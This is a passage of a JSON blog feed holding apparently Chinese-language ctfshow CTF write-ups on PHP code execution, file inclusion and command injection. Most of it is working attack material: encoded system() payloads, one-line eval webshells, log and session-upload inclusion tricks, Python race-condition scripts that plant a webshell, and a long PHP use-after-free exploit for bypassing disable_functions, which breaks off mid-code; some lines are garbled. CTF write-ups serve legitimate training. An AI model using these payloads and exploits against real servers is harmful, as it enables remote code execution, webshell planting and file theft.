(如果变量已存在，将会覆盖变量)</p>\n<p>由于不能在POST里直接传<code>key1</code>和<code>key2</code>的值，所以可以通过GET方式，传入变量名为<code>_POST</code>的变量，使得其在之后的<code>extract</code>能够覆盖原理啊的<code>key1</code>和<code>key2</code></p>\n<p>payload:<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p>\n<h1 id=\"web-135\"><a href=\"#web-135\" class=\"headerlink\" title=\"web 135\"></a>web 135</h1><h2 id=\"cp-命令\"><a href=\"#cp-命令\" class=\"headerlink\" title=\"cp 命令\"></a>cp 命令</h2><h2 id=\"ping\"><a href=\"#ping\" class=\"headerlink\" title=\"ping\"></a>ping</h2><h2 id=\"web-136\"><a href=\"#web-136\" class=\"headerlink\" title=\"web 136\"></a>web 136</h2><h2 id=\"tee-命令\"><a href=\"#tee-命令\" class=\"headerlink\" title=\"tee 命令\"></a>tee 命令</h2><p><code>?c=ls /|tee 1</code></p>\n<p>将<code>ls /</code>的回显写入1文件</p>\n<p>使用nl命令</p>\n<p>之后可以使用同样命令，然后返回即可</p>\n<h2 id=\"修改文件内容\"><a href=\"#修改文件内容\" class=\"headerlink\" title=\"修改文件内容\"></a>修改文件内容</h2><p><code>?c=ls |xargs sed -i 's/exec/echo/'</code></p>\n<p><code>?c=ls |xargs sed -i 's/exec/system/'</code></p>\n<p>重新访问题目，可以发现字符串匹配下<code>die</code>变为<code>echo</code>，也就是说，即使满足正则匹配，代码不会结束，会执行后面的代码</p>\n<p>无回显的<code>exec</code>变为了<code>system</code>，可以输入命令并回显</p>\n<h1 id=\"web-137\"><a href=\"#web-137\" class=\"headerlink\" title=\"web 137\"></a>web 137</h1><p>类静态方法的访问</p>\n<p>POST: <code>ctfshow=ctfshow::getFLag</code></p>\n<h1 id=\"web-138\"><a href=\"#web-138\" class=\"headerlink\" title=\"web 138\"></a>web 138</h1><p>ban掉了冒号</p>\n<p>查看文档，找寻访问静态方法的另一种手段</p>\n<p><code>call_user_func</code></p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/static_visit.png\"></p>\n<p>也就是说可以通过给<code>call_user_func</code>传入一个数组，使其访问</p>\n<p>所以payload:<code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</code>（该语句意义为给 ctfshow [] 赋两个值）</p>\n<h1 id=\"web-139\"><a href=\"#web-139\" class=\"headerlink\" title=\"web 139\"></a>web 139</h1><p>经过测试，如果想要<code>intval($code) == 'ctfshow'</code>为 true</p>\n<p>那么<code>code</code>也应该为字符串</p>\n<p>而<code>$code = eval(\"return $f1($f2());\");</code></p>\n<p>所以必须要使函数返回字符串，</p>\n<pre><code class=\"php\">f1=system&amp;f2=getcwd\nf1=system&amp;f2=system\n</code></pre>\n<h1 id=\"web-141\"><a href=\"#web-141\" class=\"headerlink\" title=\"web 141\"></a>web 141</h1><pre><code class=\"php\">if (is_numeric($v1) &amp;&amp; is_numeric($v2)) {\n        if (preg_match('/^\\W+$/', $v3)) {\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \" . $code;\n        }\n    }\n</code></pre>\n<p>由判断及正则匹配，知v1，v2为数字，v3为非字母</p>\n<p>测试</p>\n<pre><code class=\"php\">$test = $_GET['test'];\neval(\"$test;\");\n?test=phpinfo()\n</code></pre>\n<p><code>phpinfo()</code> 被成功执行，也就是说该写法成立 (相当于以前的`eval ($c));?c=phpinfo())</p>\n<p>在上面的语句中，分号已写不用自己补，因此会执行该代码</p>\n<p>而由于题目执行的代码是<code>$v1$v3$v2</code>,<code>v1</code>，<code>v2</code>必为数字，所以可控的字符只有<code>v3</code>，并要将其于前后分开</p>\n<p>进行测试</p>\n<pre><code class=\"php\">1-phpinfo()-1\n</code></pre>\n<p>可以执行，所以可以传入<code>?v1=1&amp;v2=1&amp;v3=</code>命令进行</p>\n<p>但又因<code>3</code>不能出现字母，而大多数函数都有字母，这里采用<code>16</code>进制构造的方法构造出命令</p>\n<p>例如</p>\n<pre><code class=\"php\">//system('ls')\n?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80^%ec%f3)-   \n//system('tac flag.php')\n?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80%80%80%80%80%80%80%80%80%80%80^%f4%e1%e3%a0%e6%ec%e1%e7%ae%f0%e8%f0)-\n</code></pre>\n<h1 id=\"web-142\"><a href=\"#web-142\" class=\"headerlink\" title=\"web 142\"></a>web 142</h1><p>输入小于等于0的数字即可</p>\n<h1 id=\"web-143\"><a href=\"#web-143\" class=\"headerlink\" title=\"web 143\"></a>web 143</h1><p>同141，把减号换成乘号</p>\n<h1 id=\"web-144\"><a href=\"#web-144\" class=\"headerlink\" title=\"web 144\"></a>web 144</h1><p>原理同141, 调整一下v2，v3</p>\n<pre><code class=\"php\">?v1=1&amp;v2=(%80%80%80%80%80%80^%f3%f9%f3%f4%e5%ed)(%80%80%80%80%80%80%80%80%80%80%80%80^%f4%e1%e3%a0%e6%ec%e1%e7%ae%f0%e8%f0)&amp;v3=-\n</code></pre>\n<h1 id=\"web-145\"><a href=\"#web-145\" class=\"headerlink\" title=\"web 145\"></a>web 145</h1><p>相同原理</p>\n<p>这里使用取反运算 (或运算不能用，应为如果要用或，那么值一定在0-128内，而此时因为绝大部分可用字符被禁，也就是说此时不能构造出满足条件的)</p>\n<p>并使用三元条目运算符 <code>?ex1:ex2</code></p>\n<p><code>?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):</code></p>\n<p>或者用没有过滤的或运算</p>\n<p><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)|</code></p>\n<h1 id=\"web-146\"><a href=\"#web-146\" class=\"headerlink\" title=\"web 146\"></a>web 146</h1><p>同145第二种解法</p>\n<h1 id=\"web-147\"><a href=\"#web-147\" class=\"headerlink\" title=\"web 147\"></a>web 147</h1><p><code>if (!preg_match('/^[a-z0-9_]*$/isD', $ctfshow))</code></p>\n<p>不能有数字字母开头</p>\n<p>利用命名空间<code>\\函数名</code></p>\n<p>首先使用<code>\\phpinfo</code>, 发现提示用了2个函数</p>\n<p>这里可以采用匿名函数，然后传入<code>show</code>使其闭合<code>if</code>判断，最后注释后面的语句</p>\n<p>payload:</p>\n<pre><code class=\"php\">?show=}system('tac flag.php');/*\nctf=\\create_function\n</code></pre>\n<h1 id=\"web-148\"><a href=\"#web-148\" class=\"headerlink\" title=\"web 148\"></a>web 148</h1><p>同 141</p>\n<p><strong>或者</strong></p>\n<p>调用函数方法</p>\n<pre><code class=\"php\">get_ctfshow_fl0g()\n?code = (%80%80%80%80%80%80%80%80%80%80%80%80%80%80%80%80^%e7%e5%f4%df%e3%f4%e6%f3%e8%ef%f7%df%e6%ec%b0%e7)();\n</code></pre>\n<h1 id=\"web-149\"><a href=\"#web-149\" class=\"headerlink\" title=\"web 149\"></a>web 149</h1><p>覆盖index.php</p>\n<p>payload：</p>\n<pre><code class=\"php\">?ctf=index.php \nPOST:show=&lt;?php eval($_POST[1]);?&gt;\n</code></pre>\n<h1 id=\"web-150\"><a href=\"#web-150\" class=\"headerlink\" title=\"web 150\"></a>web 150</h1><p>日志包含</p>\n<pre><code class=\"php\">&lt;?php eval($_REQUEST[1]);?&gt;\n</code></pre>\n<p>然后利用ctf传参，传入日志的路径，使日志被访问</p>\n<pre><code class=\"raw\">ctf=/var/log/nginx/access.log\n</code></pre>\n<p>设置isVIP的值为1，使最下面的if条件成立</p>\n<pre><code class=\"raw\">?isVIP=1\n</code></pre>\n<h1 id=\"web-150-plus\"><a href=\"#web-150-plus\" class=\"headerlink\" title=\"web 150-plus\"></a>web 150-plus</h1><p><code>__autoload()</code><br>当第一次使用一个类 A 时，如果找不到，会自动调用<code>__autoload()</code>方法，并将类名<code>A</code>作为参数传入，我们在<code>__autoload()</code>中需要的做的就是根据类名，找到相应的文件，并包含进来。</p>\n<p>本题中<code>class_exists()</code>类是第一次使用，可以通过对它的使用来调用 <code>autoload ()</code>这个魔术方法输出变量<code>$class</code></p>\n<p>过滤掉了<code>_</code>，可以通过<code>…</code>绕过</p>\n<p>因为题中有<code>extract</code>函数，会将传入的数组解析掉，所以get传入：<code>?..CTFSHOW…=phpinfo</code></p>\n<p><code>phpinfo()</code> 里面有flag</p>\n<p>预期解：<strong>条件竞争</strong></p>\n<p><code>ctf=1.php</code></p>\n<p><code>show=&lt;?php system('tac /c*');?&gt;</code></p>\n<p>使用bp不断访问并传参，然后开一个去不断访问1.php</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/31915a1e/",
            "url": "http://dpm12345.cn/posts/31915a1e/",
            "title": "文件包含",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-78\"><a href=\"#web-78\" class=\"headerlink\" title=\"web 78\"></a>web 78</h1><p>php 伪协议</p>\n<h1 id=\"web-79\"><a href=\"#web-79\" class=\"headerlink\" title=\"web 79\"></a>web 79</h1><p>data伪协议<code>data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-80\"><a href=\"#web-80\" class=\"headerlink\" title=\"web 80\"></a>web 80</h1><p>data 协议被禁用</p>\n<p>可以尝试日志包含</p>\n<p><code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n<h1 id=\"web-82\"><a href=\"#web-82\" class=\"headerlink\" title=\"web 82\"></a>web 82</h1><pre><code class=\"python\">#coding=utf-8\nimport io\nimport requests\nimport threading\nsessid = 'TGAO'          #sessionid 值，也为控制的文件名\ndata = {\"cmd\":\"system('whoami');\"}         #进行的命令\n\n# 写文件\ndef write(session):\n    while True:\n        f = io.BytesIO(b'a' * 1024 * 50)      #写入的文件内容\n        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[\"cmd\"]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )\n        #'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval ($_POST [\"cmd\"]);?&gt;' 为一句话木马\n        # files={'file': ('tgao.txt',f)} 为上传的文件\n        # cookies={'PHPSESSID': sessid}，设置 sessid，控制文件名\n        \n# 读文件\ndef read(session):\n    while True:\n        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)\n        if 'tgao.txt' in resp.text:\n            print(resp.text)\n            event.clear()\n        else:\n            print(\"[+++++++++++++]retry\")\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in xrange(1,30): \n            threading.Thread(target=write,args=(session,)).start()\n        for i in xrange(1,30):\n            threading.Thread(target=read,args=(session,)).start()\n    event.set()\n</code></pre>\n<pre><code class=\"python\">import requests\nimport io\nimport threading\nurl = ' http://4c773cea-91fa-498e-8027-46bab5889b16.challenge.ctf.show:8080/'\nsessionid = 'ctfshow'\ndata = {\n    \"1\": \"file_put_contents( '/var/www/html/2.php','&lt;?php eval($_ POST[2]);?&gt;');\"\n}\n\n\ndef write(session):\n    fileBytes = io.BytesI0(b' a'*1024*50)\n    while True:\n        response = session.post(url,\n                                data={\n                                    ' PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_ POST[1]);?&gt;'\n                                },\n                                cookies={\n                                    ' PHPSESSID': sessionid\n                                },\n                                files={\n                                    'file': ('ctfshow.jpg ', fileBytes)\n                                }\n                                )\n\n\ndef read(session):\n    while True:\n        response = session.post(url + '?file=/tmp/sess_' + sessionid, data=data,\n                                cookies={\n                                    'PHPSESSID': sessionid\n                                }\n                                )\n        resposne2 = session.get(url + '2.php ')\n        if resposne2.status_code == 200:\n            print('++++++done++++++')\n        else:\n            print(resposne2.status_code)\n\n\nif __name__ == '__main__':\n    evnet = threading . Event()\n    with requests.session() as session:\n        for i in range(5):\n            threading. Thread(target=write, args=(session,)).start()\n        for i in range(5):\n            threading. Thread(target=read, args=(session,)) .start()\nevnet. set()\n</code></pre>\n<h1 id=\"web-83-x2F-84\"><a href=\"#web-83-x2F-84\" class=\"headerlink\" title=\"web 83 /84\"></a>web 83 /84</h1><p>83使用了</p>\n<pre><code class=\"php\">session_unset();\nsession_destroy;\n</code></pre>\n<p>84使用了</p>\n<pre><code class=\"php\">system(\"rm -rf /tmp/*\");\n</code></pre>\n<p>但都可以用82脚本跑出，第一个为脚本中session的设置，第二个为线程的作用，刚删但刚写</p>\n<h1 id=\"web-85\"><a href=\"#web-85\" class=\"headerlink\" title=\"web 85\"></a>web 85</h1><p>虽然有对内容”&lt;”的判断，但还是可以通过上面代码进行，增加线程即可</p>\n<h1 id=\"web-87\"><a href=\"#web-87\" class=\"headerlink\" title=\"web 87\"></a>web 87</h1><p>改为写文件了，可以使用过滤器</p>\n<pre><code class=\"php\">php://filter/write=string.rot13/resource=2.php\n</code></pre>\n<p>因为是对file的解码，因此对file的内容进行两次url编码，上传后，访问2.php文件即可</p>\n<h1 id=\"web-88\"><a href=\"#web-88\" class=\"headerlink\" title=\"web 88\"></a>web 88</h1><p>data 协议，base64 编码，构造出不带 =，+ 号的编码</p>\n<p><code>data://text/plain;base64,&lt;?php system('ls');?&gt;</code></p>\n<h1 id=\"web-117\"><a href=\"#web-117\" class=\"headerlink\" title=\"web 117\"></a>web 117</h1><p>伪协议，过滤器，死亡绕过</p>\n<p>通过转码使得院死亡代码无效，使自己的代码有效</p>\n<pre><code class=\"php\">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/b013ba57/",
            "url": "http://dpm12345.cn/posts/b013ba57/",
            "title": "信息收集 爆破 命令执行",
            "date_published": "2022-10-04T14:11:40.000Z",
            "content_html": "<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><ol>\n<li>robots #</li>\n<li>域名解析 #</li>\n<li>.git<code>.svn</code>.swp </li>\n<li>editor 编辑器 如果访问一个不存在的目录，那么会列出根目录的所有文件 </li>\n<li>邮箱 qq 号泄漏部分信息 </li>\n<li>探针访问默认的 tz.php </li>\n<li>ip 访问，cdn 缓存清除 / 绕过，可加 www 绕过 </li>\n<li>Unicode 编码（可使用控制台输出) </li>\n<li>前端密码验证 可以绕过前端 js 直接 post 传入 </li>\n<li>access 数据库 db 目录下的 data.mdb db.mdb</li>\n<li></li>\n</ol>\n<h1 id=\"爆破\"><a href=\"#爆破\" class=\"headerlink\" title=\"爆破\"></a>爆破</h1><ol>\n<li>域名爆破子域名 <span class=\"exturl\" data-url=\"aHR0cDovL3BocGluZm8ubWUv\">phpinfo.me</span></li>\n<li>php_mt_seed</li>\n<li>\\uxx 可以用 consoleolog</li>\n<li></li>\n</ol>\n<h1 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h1><h2 id=\"Linux-中的-cp-命令\"><a href=\"#Linux-中的-cp-命令\" class=\"headerlink\" title=\"Linux 中的 cp 命令\"></a>Linux 中的 cp 命令</h2><p>利用cp命令将flag.php写入1.txt，然后访问1.txt</p>\n<p><code>system (\"cp fla?.php 1.txt\");</code>(对 flag 进行过滤)（mv 也行）</p>\n<h2 id=\"system-过滤可以使用反引号绕过，反引号作用相当于-system\"><a href=\"#system-过滤可以使用反引号绕过，反引号作用相当于-system\" class=\"headerlink\" title=\"system 过滤可以使用反引号绕过，反引号作用相当于 system\"></a>system 过滤可以使用反引号绕过，反引号作用相当于 system</h2><h2 id=\"嵌套-eval，主要用于过滤了相应查找的函数\"><a href=\"#嵌套-eval，主要用于过滤了相应查找的函数\" class=\"headerlink\" title=\"嵌套 eval，主要用于过滤了相应查找的函数\"></a>嵌套 eval，主要用于过滤了相应查找的函数</h2><p>payload:<code>?a=eval($_GET[1]);&amp;1=phpinfo();</code></p>\n<p>其中 <code>1</code> 已经逃逸，可以使用任何命令</p>\n<p>(可以使用 system (“tac flag.php”) 直接查看源码)(tac 为 cat 的逆序)</p>\n<h2 id=\"分号被-ban\"><a href=\"#分号被-ban\" class=\"headerlink\" title=\"分号被 ban\"></a>分号被 ban</h2><p>可以使用文件包含的方法，<code>include%0a$_GET [1]&amp;1=phpinfo();</code></p>\n<p>此时1已经逃逸，若想查看文件内容，可使用php伪协议，base-64编码查看 (同时可以把include换成require)</p>\n<h2 id=\"data-协议\"><a href=\"#data-协议\" class=\"headerlink\" title=\"data 协议\"></a>data 协议</h2><p><code>data://text/plain,(php代码)</code></p>\n<h2 id=\"web-40\"><a href=\"#web-40\" class=\"headerlink\" title=\"web 40\"></a>web 40</h2><pre><code class=\"php\">if (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    eval($c);\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre>\n<p>可用<code>show_source(next(array_reverse(scandir(pos(loc)lecony))));</code></p>\n<p>或者<code>?c=eval(arry_pop(next(get_difined_vars())));</code></p>\n<p>其中 <code>get_defined_vars()</code>,获取所有的变量值，之前可以进行打印，可以发现有 post 传值，传入后会有显示，那么需要拿到传上的值， </p>\n<p>由于 post 在第二个，可用 next 获取下一个，<code>array_pop()</code>弹出，然后使用<code>eval</code>执行</p>\n<p>执行过程</p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web40_1.png\"></p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web40_2.png\"></p>\n<p>可看到由于传值，使得post有值了</p>\n<p>那么接下来就是获取并执行</p>\n<h2 id=\"web-41\"><a href=\"#web-41\" class=\"headerlink\" title=\"web 41\"></a>web 41</h2><p>这个题过滤了<code>$、+、-、^、~</code>使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符 |。</p>\n<p>我们可以尝试从 ascii 为 0-255 的字符中，找到或运算能得到我们可用的字符的字符。</p>\n<p>这里先给出两个脚本<code>exp.py``rce_or.php</code>，大家以后碰到可以使用或运算绕过的可以自己手动修改下即可。</p>\n<p>生成可用字符的集合</p>\n<pre><code class=\"php\">&lt;?php\n$myfile = fopen(\"rce_or.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i &lt; 256; $i++) { \n    for ($j=0; $j &lt;256 ; $j++) { \n\n        if($i&lt;16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j&lt;16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/i';\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n                    echo \"\";\n    }\n  \n        else{\n        $a='%'.$hex_i;\n        $b='%'.$hex_j;\n        $c=(urldecode($a)|urldecode($b));\n        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {\n            $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n        }\n    }\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n</code></pre>\n<p>大体意思就是<code>从进行异或的字符中排除掉被过滤的，然后再判断异或得到的字符是否为可见字符</code></p>\n<p>传递参数<code>getflag</code></p>\n<p>脚本</p>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\nimport requests\nimport urllib\nfrom sys import *\nimport os\nos.system(\"php rce_or.php\")  #没有将 php 写入环境变量需手动运行\nif(len(argv)!=2):\n    print(\"=\"*50)\n       print('USER：python exp.py &lt;url&gt;')\n       print(\"eg：  python exp.py http://ctf.show/\")\n       print(\"=\"*50)\n       exit(0)\nurl=argv[1]\ndef action(arg):\n       s1=\"\"\n       s2=\"\"\n       for i in arg:\n           f=open(\"rce_or.txt\",\"r\")\n           while True:\n               t=f.readline()\n               if t==\"\":\n                   break\n               if t[0]==i:\n                   #print(i)\n                   s1+=t[2:5]\n                   s2+=t[6:9]\n                   break\n           f.close()\n       output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\"\n       return(output)\n   \nwhile True:\n       param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))\n       data={\n           'c':urllib.parse.unquote(param)\n           }\n       r=requests.post(url,data=data)\n       print(\"\\n[*] result:\\n\"+r.text)\n</code></pre>\n<pre><code>                             -- 来源于[ yu22x 的博客文章](https://blog.csdn.net/miuzzx/article/details/108569080)\n</code></pre>\n<h2 id=\"web-42\"><a href=\"#web-42\" class=\"headerlink\" title=\"web 42\"></a>web 42</h2><p>双写绕过，分号分隔，分号后面被写入</p>\n<h2 id=\"web-43\"><a href=\"#web-43\" class=\"headerlink\" title=\"web 43\"></a>web 43</h2><p>源码类型同42，但过滤了分号和<code>cat</code>，可以使用<code>&amp;&amp;</code>, 用来分隔两个命令，如果前一个执行成功第二个不会执行</p>\n<h2 id=\"web-50、51\"><a href=\"#web-50、51\" class=\"headerlink\" title=\"web 50、51\"></a>web 50、51</h2><p>不用空格的命令</p>\n<p><code>?c=nl&lt;fla''g.php%7C%7Cls</code>(<code>%7C%7C</code> 为<code>||</code>) 其中不用通配符是因为不支持，使用单引号忽略</p>\n<h2 id=\"web-55\"><a href=\"#web-55\" class=\"headerlink\" title=\"web 55\"></a>web 55</h2><p>无字母 RCE</p>\n<p>可以上传文件到服务器上</p>\n<p>在本地制作文件上传表单</p>\n<p>而上传后php会把该文件放在一个临时目录下，命名规则为 php+5 位小写字母 + 大写字母，但该文件名不可控，可以使用占位符进行匹配</p>\n<p><code>/???/????????</code>而如果最后有大写字母，也可以写成<code>/???/???????[@-[]</code></p>\n<p>如果点号 . 没有过滤，在linux系统里可以使用点号. 用来执行脚本文件，即可写<code>?c=.%20/???/??????[@-[]</code></p>\n<p>然后通过抓包不断修改文件的内容</p>\n<h2 id=\"web-57\"><a href=\"#web-57\" class=\"headerlink\" title=\"web 57\"></a>web 57</h2><p>题目只要构造出 36 即可，而 $ 没有过滤，可以使用 $(()) 进行构造</p>\n<p><code>echo $(())</code>返回0，取反后<code>echo $((~$(())))</code>即为-1，那么我们可以加上37个-1再取反</p>\n<p><code>echo ~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))</code></p>\n<p>返回36</p>\n<h2 id=\"web-62、63、64\"><a href=\"#web-62、63、64\" class=\"headerlink\" title=\"web 62、63、64\"></a>web 62、63、64</h2><ol>\n<li><code>include(\"flag.php\");echo $flag;</code></li>\n<li>或者先 include 包含 flag.php，再使用 get_defined_vars (), 获取变量名及值</li>\n<li></li>\n</ol>\n<h2 id=\"web-66\"><a href=\"#web-66\" class=\"headerlink\" title=\"web 66\"></a>web 66</h2><p><code>var_dump(scandir('*'));var_dump(scandir ('/'));</code>读取相关的目录</p>\n<h2 id=\"web-68\"><a href=\"#web-68\" class=\"headerlink\" title=\"web 68\"></a>web 68</h2><p><code>highlight_file</code>被禁，用<code>include</code>，<code>include ('/flag.txt');</code>因为没有php代码，则直接输出</p>\n<h2 id=\"web-71\"><a href=\"#web-71\" class=\"headerlink\" title=\"web 71\"></a>web 71</h2><p>内容被替换</p>\n<p>思路为提前结束，不执行下面的代码</p>\n<p><code>include('flag.txt');exit();</code></p>\n<h2 id=\"web-72\"><a href=\"#web-72\" class=\"headerlink\" title=\"web 72\"></a>web 72</h2><p><code>var_dump()</code>被禁</p>\n<p><code>scandir('/')</code>不能正确读取，因为有了<code>open_basedir()</code>, 而<code>ini_set ()</code>也被禁用，不能修改</p>\n<p>那么可以使用<code>glob</code>协议进行绕过</p>\n<pre><code class=\"php\">c=$a=\"glob:///*.txt\";\nif($b = opendir($a)){\n    while(($file = readdir($b))!== false ){\n        echo \"filename:\".$file.\"\\n\";\n    }\n    closedir($b);\n}\nexit();// 为了绕过后面的替换内容\n</code></pre>\n<p>虽然知道flag的文件名，但是无法读取</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">?&gt;&lt;?php\npwn(\"cat /flag0.txt\");\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this-&gt;a);\n            $backtrace = (new Exception)-&gt;getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n    function str2ptr(&amp;$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j &gt;= 0; $j--) {\n            $address &lt;&lt;= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i &lt; $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr &amp; 0xff));\n            $ptr &gt;&gt;= 8;\n        }\n        return $out;\n    }\n    function write(&amp;$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i &lt; $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v &amp; 0xff));\n            $v &gt;&gt;= 8;\n        }\n    }\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper-&gt;a);\n        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }\n        return $leak;\n    }\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n        for($i = 0; $i &lt; $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n        return [$data_addr, $text_size, $data_size];\n    }\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i &lt; $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n            return $data_addr + $i * 8;\n        }\n    }\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak &amp; 0xfffffffffffff000;\n        for($i = 0; $i &lt; 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n    function my_str_repeat($a,$b){\n        $s = '';\n        for($i = 0; $i &lt;= $b;$i++){\n            $s.=$a;\n        }  \n        return $s;\n    }\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(my_str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln-&gt;a = $arg;\n    }\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i &lt; $n_alloc; $i++)\n        $contiguous[] = str_shuffle(my_str_repeat('A', 79));\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n    $helper = new Helper;\n    $helper-&gt;b = function ($x) { };\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n    $closure_obj = str2ptr($abc, 0x20);\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        